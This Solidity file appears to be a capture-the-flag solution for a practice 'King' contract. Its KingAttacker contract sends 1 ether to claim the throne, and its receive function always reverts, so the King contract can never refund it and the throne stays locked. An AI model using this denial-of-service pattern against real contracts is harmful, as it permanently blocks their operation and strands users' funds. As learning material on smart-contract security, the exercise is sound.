pragma solidity ^0.6.0;
import "./9-King.sol";

contract KingAttacker {
    King kingContract;
    address payable immutable i_kingContractAddress;

    constructor(address payable kingContractAddress) public {
        kingContract = King(kingContractAddress);
        i_kingContractAddress = kingContractAddress;
    }

    function attack() external payable {
        require(msg.value == 1 ether, "please send exactly 1 ether");
        // claim throne
        // use call here instead of king.transfer because transfer
        // has a gas limit and runs out of gas
        (bool success, ) = payable(address(i_kingContractAddress)).call{value: msg.value}("");
        require(success, "External call failed");
    }

    receive() external payable {
        // when the contract tries to reclaim the ownership the require will revert the transaction
        require(false, "cannot claim my throne!");
    }
}
